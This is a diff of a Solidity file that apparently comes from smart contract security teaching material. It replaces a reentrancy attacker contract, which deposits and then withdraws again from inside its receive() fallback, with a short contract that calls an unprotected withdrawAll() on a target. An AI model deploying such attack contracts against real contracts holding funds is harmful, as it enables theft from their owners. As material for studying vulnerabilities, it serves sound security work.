@@ -1,27 +1,20 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.24;
 
-import "./Reentrancy.sol";
+interface IAccessControl {
+    function withdrawAll() external;
+}
 
-contract Attacker {
-    ReentrancyVulnerable public target;
+contract AccessControlAttack {
+    IAccessControl public target;
 
     constructor(address _target) {
-        target = ReentrancyVulnerable(_target);
+        target = IAccessControl(_target);
     }
 
-    // deposit into target
-    function attack() external payable {
-        require(msg.value >= 1 ether, "Need at least 1 ETH");
-
-        target.deposit{value: 1 ether}();
-        target.withdraw();
+    function attack() public {
+        target.withdrawAll();
     }
 
-    // fallback gets triggered during reentrancy
-    receive() external payable {
-        if (address(target).balance >= 1 ether) {
-            target.withdraw();
-        }
-    }
+    receive() external payable {}
 }
